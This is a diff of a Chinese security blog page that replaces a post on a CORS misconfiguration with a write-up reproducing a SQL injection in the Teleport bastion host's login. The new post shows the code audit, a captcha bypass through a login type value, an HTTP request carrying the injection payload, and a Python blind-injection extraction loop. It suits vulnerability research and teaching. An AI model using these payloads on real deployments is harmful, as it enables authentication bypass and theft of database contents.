@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="对CORS漏洞的学习，并且绕过sop限制，弄出演示demo。">
+  <meta name="description" content="从源码中推理出漏洞并且编写POC">
   <meta name="author" content="corp0ra1">
   <meta name="keywords" content="">
   
-  <title>CORS漏洞学习及实战应用 - corp0ra1&#39;s Blog</title>
+  <title>TELEPORT堡垒机SQL注入漏洞 - corp0ra1&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -165,7 +165,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="CORS漏洞学习及实战应用">
+            <span class="h2" id="subtitle" title="TELEPORT堡垒机SQL注入漏洞">
               
             </span>
 
@@ -175,8 +175,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2019-07-21 15:41" pubdate>
-        2019年7月21日 下午
+      <time datetime="2019-08-06 21:53" pubdate>
+        2019年8月6日 晚上
       </time>
     </span>
   
@@ -187,7 +187,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.5k 字
+      1.6k 字
     </span>
   
 
@@ -197,7 +197,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      16
+      19
        分钟
     </span>
   
@@ -236,78 +236,127 @@
                         <article class="post-content mx-auto">
                             <!-- SEO header -->
                             <h1 style="display: none">
-                                CORS漏洞学习及实战应用
+                                TELEPORT堡垒机SQL注入漏洞
                             </h1>
                             <div class="markdown-body">
-                                <h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>同事搞了个cors的漏洞，什么是cors?我怎么没有听说过？啥玩意啊？我干</p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>谈及cors,需要先了解同源策略，跨域请求方案等。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82931250">传送门</a></p>
-<ol>
-<li>同源策略<ol>
-<li> 是指域名，协议，端口相同</li>
-<li> 目的是为了自己的数据只能自己，其他人无法访问</li>
-</ol>
-</li>
-<li>跨域请求方案<ol>
-<li> 目的为了突破同源策略的限制，使得自己的数据自己的朋友也可以访问</li>
-<li> 两种方案jsonP和cors</li>
-</ol>
-</li>
-<li>jsonP和cors区别 <a target="_blank" rel="noopener" href="https://blog.csdn.net/saytime/article/details/51549888">传送门</a><ol>
-<li> SONP只能实现GET请求，而CORS支持所有类型的HTTP请求。</li>
-<li> 使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。</li>
-<li>JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS<blockquote>
-<p>CROS是现在主流解决跨域问题的方案，未来估计也是趋势。</p>
+                                <h1 id="TELEPORT堡垒机SQL注入漏洞"><a href="#TELEPORT堡垒机SQL注入漏洞" class="headerlink" title="TELEPORT堡垒机SQL注入漏洞"></a>TELEPORT堡垒机SQL注入漏洞</h1><h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>数字观星出了一个新的漏洞<a target="_blank" rel="noopener" href="https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4409">《Teleport 堡垒机 username 存在SQL注入漏洞》</a></p>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>TELEPORT 堡垒机 登录username参数 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息等。</p>
 </blockquote>
-<h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><h2 id="什么是cors"><a href="#什么是cors" class="headerlink" title="什么是cors"></a>什么是cors</h2>CORS 是一个 W3C 标准，全称是“跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨域的服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。<br>CORS定义了两种跨域请求：简单请求 和 非简单请求。简单跨域请求就是使用设定的请求方式请求数据，而非简单跨域请求则是在使用设定的请求方式请求数据之前，先发送一个OPTIONS预检请求，验证请求源是否为服务端允许源。只有”预检”通过后才会再发送一次请求用于数据传输。<a target="_blank" rel="noopener" href="http://javascript.ruanyifeng.com/bom/cors.html">详情点此传送门</a></li>
-</ol>
-</li>
-</ol>
-<h2 id="cors漏洞成因"><a href="#cors漏洞成因" class="headerlink" title="cors漏洞成因"></a>cors漏洞成因</h2><p>就是对cors的配置错误，导致攻击者可以伪装为受害者服务器所允许站点去获取受害者服务器上的资源<br>具体利用，我觉得几篇paper讲的比较清楚的，推荐下</p>
+<p>思路：</p>
 <ol>
-<li> 18年DefConChina的陈建军的议题《从外部入侵内网，跨域资源共享（CORS）的安全问题》<a target="_blank" rel="noopener" href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#1-1-%E4%BB%8E-sop-%E5%88%B0-cors">传送门</a></li>
-<li> 百度挺多的，直接搜就行了,多看几篇文章即可。但是本源还是上面的陈建军师傅的paper</li>
-<li> portswigger的文章<a target="_blank" rel="noopener" href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">传送门</a>中文翻译文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2702">传送门</a></li>
-<li> 国外大牛的paper<a target="_blank" rel="noopener" href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/">传送门</a>（其实我觉得很稀烂，可能因为语言原因）</li>
-<li> 发现一片13年的文章，说明漏洞研究挺久的<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/18493.html">传送门</a></li>
+<li>fofa搜产品个数，看价值多寡，是否去利用</li>
+<li>google搜产品详细信息，发现是开源产品，可以代码审计利用。<a target="_blank" rel="noopener" href="https://github.com/tp4a/teleport">Github仓库链接</a></li>
+<li>搭建环境的同时代码审计跟踪逻辑</li>
 </ol>
-<h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>陈建军师傅开发的工具CORScanner<a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">传送门</a></p>
-<h1 id="一个案例"><a href="#一个案例" class="headerlink" title="一个案例"></a>一个案例</h1><h2 id="文章概述"><a href="#文章概述" class="headerlink" title="文章概述"></a>文章概述</h2><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827182215.png" srcset="/img/loading.gif" lazyload alt="20190827182215.png"><br>由上图可以看出特征点Access-Control-Allow-Origin和Access-Control-Allow-Credentials。疑似存在cors漏洞</p>
-<ul>
-<li>  这是个cors漏洞，但因为利用场景极其苛刻，可以说正常情况下基本利用不了。仅供出具渗透测试报告给厂商，作一个风险证明。</li>
-<li>  为什么场景苛刻，只能做个证明？因为浏览器sop的限制，导致跨域访问很难进行。参考陈建军师傅<a target="_blank" rel="noopener" href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2-6-origin-%E4%B8%8E-credentials-true-%E5%85%B1%E7%94%A8">《文章的2.6章节》</a>和CSDN文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/haoren_xhf/article/details/80050311">《Access-control-allow-origin:*并没有实际危害（更新）》</a></li>
-<li>我怎么做的？<ul>
-<li>  观察到客户端有请求到对应站点，同时服务器有返回包返回给客户端，只不过本地浏览器的限制导致无法利用。既然浏览器的问题，则可以通过换个浏览器，或者换个版本尝试。</li>
-<li>  chrome尝试执行命令disable掉安全选项，但是无果。firefox也报错,ie9对异步请求支持不行。</li>
-<li>  最后我采取ie同时disable掉一些安全选项。ie版本:11.295.18362.0</li>
-</ul>
+<blockquote>
+<p>fofa资产300+，github star有769个</p>
+</blockquote>
+<h1 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h1><p>简单尝试<code>admin&#39;—</code>, <code>admin&#39;</code> , <code>admin&#39;&quot;--+</code> , <code>admin&#39;&quot;）-—</code> 逻辑，发现无果，于是打算源码审计看看</p>
+<h2 id="初步定位"><a href="#初步定位" class="headerlink" title="初步定位"></a>初步定位</h2><p>因为根据数字观星的漏洞公告中写的是“登陆处的username存在注入”，故跟踪登录逻辑：</p>
+<ol>
+<li>登录请求包中的请求路径为<code>/auth/do-login</code></li>
+<li><code>do-login</code>调用<code>auth.DoLoginHandler</code> 方法。</li>
+<li>跟踪<code>auth.DoLoginHandler</code> 方法 <a target="_blank" rel="noopener" href="https://github.com/tp4a/teleport/blob/5f1a3d0f259910fdc9c4a16c8ae542619e4e0891/server/www/teleport/webroot/app/controller/auth.py#L68">链接</a></li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%201.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%202.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="简单绕过验证码"><a href="#简单绕过验证码" class="headerlink" title="简单绕过验证码"></a>简单绕过验证码</h2><p>跟踪<code>auth.DoLoginHandler</code> 方法，发现其逻辑</p>
+<ol>
+<li>将请求的json内容解析。如果json格式错误，则报错“参数错误”</li>
+<li>判断登录类型，进而执行不同的逻辑判断（也可以根据其登录界面判断两种登录方法，一种账密形式，一种身份验证器形式）<ol>
+<li>先判断<code>TP_LOGIN_AUTH_USERNAME_PASSWORD_CAPTCHA</code> ，也就是账密+验证码逻辑。这个简单尝试了下，并不存在验证码复用的情况。</li>
+<li>再判断身份验证器<code>TP_LOGIN_AUTH_USERNAME_PASSWORD_OATH</code>和<code>TP_LOGIN_AUTH_USERNAME_OATH</code> ，这个简单想了下，①跟踪逻辑难度偏大②即使弄懂逻辑，也似乎很难找出问题，于是先暂时搁置，往后看</li>
+</ol>
 </li>
-</ul>
-<p><strong>因为正常来说是不会disable掉这些选项的，所以难利用</strong><br>当然我也只是尝试了一部分方法然后得出上面的结论，可能有点草率，主要是网上没搜到相关文章。抛砖引玉吧！<br>如果还有其他方法，欢迎大佬们一起交流如何绕过这个限制</p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ol>
-<li>发现被限制了<br> <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/%E8%A2%AB%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E9%99%90%E5%88%B6.png" srcset="/img/loading.gif" lazyload alt="被同源策略限制.png"><br> 原因很简单：原文cors策略的限制，导致如果Access-Control-Allow-Origin为*，则Access-Control-Allow-Credentials不可以为true</li>
-<li>在Stack Overflow上找到解决方法，即采取disable掉一些安全选项。<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/20947359/how-to-disable-same-origin-policy-internet-explorer/20947828#20947828">传送门</a><br> <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827172718.png" srcset="/img/loading.gif" lazyload alt="20190827172718.png"><br> 我的disable过程截图，见文末，就不占正文空间了。</li>
-<li>构建cors站点的poc很多，推荐两个GitHub上的<a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">陈建军师傅的版本</a>以及<a target="_blank" rel="noopener" href="https://github.com/topavankumarj/CORS-Exploit-Script/blob/master/cors.html">我使用的版本</a><br> 由于前端代码功力太弱，建军师傅的poc我只能打印console log，然后报错，尝试半天，就换了其他的。emmm前端很菜勿喷</li>
+<li>登录一共有四个登录判断逻辑，上述只判断了三个，故还有一个漏网之鱼：<code>TP_LOGIN_AUTH_USERNAME_PASSWORD</code><ol>
+<li>这个逻辑不用验证码（根据其命名规则也可以看出），故可以轻松绕过验证码</li>
 </ol>
-<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>最后的利用截图（别问，政企客户打码得死死的！)<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/cors%E6%89%93%E7%A0%81.gif" srcset="/img/loading.gif" lazyload alt="cors打码.gif"></p>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="白帽汇的一篇cors文章"><a href="#白帽汇的一篇cors文章" class="headerlink" title="白帽汇的一篇cors文章"></a>白帽汇的一篇cors文章</h3><p>白帽汇的<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/2440.html">翻译文章</a> 以及英文的<a target="_blank" rel="noopener" href="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors">原文</a> </p>
-<p>白帽汇的这篇cors的翻译文章的第一攻击场景，说<strong>Access-Control-Allow-Origin=*</strong> 和 <strong>Access-Control-Allow-Credentials=true</strong>同时出现就可以利用，其实是错误的。主要是没有注意英文原文下面的评论部分</p>
-<p>这个更加警醒我自己，纸上得来终觉浅，还是要自己亲自尝试才是！</p>
-<h3 id="其他失败的尝试过程"><a href="#其他失败的尝试过程" class="headerlink" title="其他失败的尝试过程"></a>其他失败的尝试过程</h3><p>chrome的尝试跨域的解决方法</p>
-<ul>
-<li>  插件法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/a1333888/article/details/52575325">https://blog.csdn.net/a1333888/article/details/52575325</a></li>
-<li>  命令法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39704803/article/details/82760363">https://blog.csdn.net/qq_39704803/article/details/82760363</a></li>
-<li>  命令法②：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Umbrella_Um/article/details/98222981">https://blog.csdn.net/Umbrella_Um/article/details/98222981</a><br>我个人尝试过chrome多个命令，但是最后还是无果</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://www.webdavsystem.com/ajax/programming/cross_origin_requests/">传送门</a>，查看该文章发现chrome和firefox如果想利用，则需要服务器端设置相关参数，而ie9貌似可以通过disable一些选项操作，但是我这个涉及到ajax异步的过程，ie9支持不够好，无法好好利用就没有深究。</p>
-<h3 id="我的disable过程截图"><a href="#我的disable过程截图" class="headerlink" title="我的disable过程截图"></a>我的disable过程截图</h3><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173022.png" srcset="/img/loading.gif" lazyload alt="20190827173022.png"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173101.png" srcset="/img/loading.gif" lazyload alt="20190827173101.png"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173133.png" srcset="/img/loading.gif" lazyload alt="20190827173133.png"></p>
-<h3 id="利用过程中ie11出现的小问题"><a href="#利用过程中ie11出现的小问题" class="headerlink" title="利用过程中ie11出现的小问题"></a>利用过程中ie11出现的小问题</h3><p>本来可以正常使用，但是中途用着用着，点击按钮就没反应<br>F12查看控制台报错“SCRIPT5007: 属性“$”的值为 null、未定义或不是 Function 对象”<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173220.png" srcset="/img/loading.gif" lazyload alt="20190827173220.png"><br>解决方法：<strong>重置ie浏览器设置即可，重置过程</strong><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173308.png" srcset="/img/loading.gif" lazyload alt="20190827173308.png"></p>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%203.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="绕过SQL注入防护措施"><a href="#绕过SQL注入防护措施" class="headerlink" title="绕过SQL注入防护措施"></a>绕过SQL注入防护措施</h2><p>其SQL注入防护措施只是检查用户名中是否包含<code>&lt;</code>，<code>&gt;</code> ，而这两个符号其实在SQL中很少出现，更多的只是防护XSS漏洞，故此SQL注入防护措施形同虚设</p>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%204.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="漏洞注入点"><a href="#漏洞注入点" class="headerlink" title="漏洞注入点"></a>漏洞注入点</h2><ol>
+<li><code>auth.DoLoginHandler</code>调用<code>user.login()</code> 方法进行登录尝试。</li>
+<li><code>user.login()</code> 方法调用<code>get_by_username()</code> 方法进行用户名判断。<a target="_blank" rel="noopener" href="https://github.com/tp4a/teleport/blob/master/server/www/teleport/webroot/app/model/user.py#L63">链接</a></li>
+<li><code>get_by_username()</code> 方法使用<code>s.where(&#39;u.username=&quot;&#123;&#125;&quot;&#39;.format(username))</code> 方式拼接用户名做where查询<ol>
+<li>根据函数写法，判断此处应该存在双引号闭合的方式SQL注入漏洞</li>
+</ol>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%205.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="辅助判断-syslog"><a href="#辅助判断-syslog" class="headerlink" title="辅助判断-syslog"></a>辅助判断-syslog</h2><p>在跟踪其代码逻辑后，发现其经常调用<code>syslog.sys_log()</code> 方法向数据库中写日志</p>
+<p>由于是自己搭建的环境，故可以登录数据库并用<code>select * from tp_syslog；</code> 的SQL语句语法查看其日志内容</p>
+<p>小坑点：搭建环境时默认用的是SQLite数据库，但是因为可能熟悉mysql更多，故其实安装环境时可以用mysql安装。<a target="_blank" rel="noopener" href="https://docs.tp4a.com/config/#use-mysql">对应安装mysql的文档链接</a></p>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%206.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h1><p>注意坑点：</p>
+<ol>
+<li>type=1,表示<code>TP_LOGIN_AUTH_USERNAME_PASSWORD</code> 进而可以绕过验证码</li>
+<li>SQL语句需要双引号闭合，但其和json格式有矛盾，故需要在前面加上转义符号</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /auth/<span class="hljs-keyword">do</span>-login HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">8.141</span>:<span class="hljs-number">7190</span><br>X-Requested-With: XMLHttpRequest<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><br>Connection: close<br>Content-Length: <span class="hljs-number">113</span><br><br>args=&#123;<span class="hljs-string">&quot;type&quot;</span>%<span class="hljs-number">3</span>a1,<span class="hljs-string">&quot;username&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;corp0ra1\&quot;or 1=2--&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;captcha&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;oath&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;remember&quot;</span>%<span class="hljs-number">3</span>afalse&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%207.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>渗透测试人员<ol>
+<li>如果遇到type=1、2、3、4的逻辑时，可以尝试变换type ID的方式来绕过验证码逻辑</li>
+<li>json也可以注入，也可以考虑双引号注入</li>
+</ol>
+</li>
+<li>开发人员<ol>
+<li>前期可能为了测试方便保留了不需要验证码接口，但隐患极大</li>
+<li>那个SQL防护措施，可能就是搞开发的不太懂安全导致的自以为很安全</li>
+</ol>
+</li>
+</ol>
+<h1 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">r = requests.post(url, cookies=_cookies, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;iv4n&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>&#125;)<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-string">&quot;1234567890qazxswedcvfrtgbnhyujmkiolp&#123;&#125;&quot;</span>:<br>        r = requests.post(url, cookies=_cookies, data=&#123;<br>            <span class="hljs-string">&quot;usernamedel&quot;</span>: f<span class="hljs-string">&quot;iv4n&#x27; and (select hex(substr(flag,&#123;i&#125;,1)) from flag)=hex(&#x27;&#123;j&#125;&#x27;)-- -&quot;</span><br>            &#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;iv4n&quot;</span> not in r.text:<br>            flag += j<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+<h2 id="字符转数字"><a href="#字符转数字" class="headerlink" title="字符转数字"></a>字符转数字</h2><p>为什么要字符转数字？①方便二分法比较②部分场景输入带引号的字符会产生错误</p>
+<p>参考: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/11604766/sqlite-char-ascii-function/43873805">《sqlite char, ascii function》</a></p>
+<p>sqlite中：① <code>hex(&#39;a&#39;)</code>②<code>unicode(&#39;a&#39;)</code> ，没有char</p>
+<p>mysql中：①<code>hex(&#39;a&#39;)</code> ②<code>ascii(&#39;a&#39;)</code> ,没有unicode</p>
+<p>故最终的payload中选择hex来测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">sqlite&gt; select;<br><span class="hljs-number">61</span><br>sqlite&gt; select ;<br><span class="hljs-number">97</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%208.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>二分法为什么要比较大小：二分法的核心就是区分大于还是小于，进而不断地缩减区间，不然就只能是爆破遍历1-127的方法了</p>
+<p>很遗憾的是前面SQL过滤了<code>&lt;</code>,<code>&gt;</code> 两个符号，而这两个符号是二分法判断的关键符号</p>
+<p>思路</p>
+<ol>
+<li>前面找sqilte的字符转数字函数翻看文档时，发现sqlite中存在<code>min()</code>函数比较大小。以：<code>select min(unicode(&#39;a&#39;),128)=128;</code> 的形式，但是无奈mysql中的<code>min()</code>函数是另外一种用法，故暂时搁置。寻找其他比较大小写的方案</li>
+<li>加减乘除：<code>hex(&#39;a&#39;)/96=1</code>,<code>hex(&#39;a&#39;)-96=0</code>的方案<ol>
+<li>除法：排除。因为mysql和sqlite中存在差异，sqlite会舍弃小数点，但mysql中会保留，如0.986的形式。（tip：mysql中可以用div函数不保留小数点，如<code>select 5 div 2</code>。<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/arithmetic-functions.html#operator_div">详见</a>）</li>
+<li>减法也不行</li>
+<li>追究核心原因是：基于大于小于的结果可以进行二分法来区分左右，但是基于除法或者减法，没有办法判别左右区间</li>
+</ol>
+</li>
+<li>between and以及in的语法<ol>
+<li>between and：<code>select 1 between 1 and 5;</code></li>
+<li>in：<code>select 1 in (1,5)；</code> </li>
+<li>虽然可以判断大小，但是前面提及需要用<code>hex()</code>函数转成十六进制，而如果使用<code>hex()</code>函数，则无法和<code>in</code>，<code>between</code>函数很好地结合在一起</li>
+<li>病态的方法：select hex(‘m’) between ‘11’ and ‘6f’;</li>
+</ol>
+</li>
+<li>位运算？异或运算？简单检索了下，发现也不行<ol>
+<li>想起了悠远的《计算机组成原理》似乎可行，转换成二进制，然后111&100;  负数首位为1，进而根据减法结果判断</li>
+</ol>
+</li>
+<li>strcmp 但是两个的函数不一致</li>
+<li>负数取余非本身，正数取余为其本身：select ((97-91)+256)%256=(97-91);</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%209.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%2010.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%2011.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/newBlogPhoto/TELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Untitled%2012.png" srcset="/img/loading.gif" lazyload></p>
 
                             </div>
                             
                                 <p class="note note-info">
                                     
                                                     本文最后更新于：
-                                                        2022年6月7日 晚上
+                                                        2022年6月10日 上午
                                                             
                                 </p>
                                 
@@ -318,8 +367,8 @@
                                                 <div class="post-meta mr-3">
                                                     <i class="iconfont icon-category"></i>
                                                     
-                                                        <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                                            渗透测试
+                                                        <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                                            漏洞复现
                                                         </a>
                                                         
                                                 </div>
@@ -328,12 +377,12 @@
                                                         <div class="post-meta">
                                                             <i class="iconfont icon-tags"></i>
                                                             
-                                                                <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                                                    渗透测试
+                                                                <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                                                    漏洞复现
                                                                 </a>
                                                                 
-                                                                <a class="hover-with-bg" href="/tags/CORS/">
-                                                                    CORS
+                                                                <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                                                    渗透测试
                                                                 </a>
                                                                 
                                                         </div>
@@ -351,9 +400,9 @@
                                                         <article class="post-prev col-6">
                                                             
                                                                 
-                                                                    <a href="/2019/08/06/%5Bnotion%5DTELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+                                                                    <a href="/2021/01/16/%5Bnotion%5DCDN%E7%BB%95%E8%BF%87%E5%92%8C%E6%A3%80%E6%B5%8B/">
                                                                         <i class="iconfont icon-arrowleft"></i>
-                                                                        <span class="hidden-mobile">TELEPORT堡垒机SQL注入漏洞</span>
+                                                                        <span class="hidden-mobile">CDN绕过和检测</span>
                                                                         <span class="visible-mobile">上一篇</span>
                                                                     </a>
                                                                     
@@ -361,8 +410,8 @@
                                                         <article class="post-next col-6">
                                                             
                                                                 
-                                                                    <a href="/2019/07/18/%5Bold%5D%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%B4%9E/">
-                                                                        <span class="hidden-mobile">first vuln from practice to practice</span>
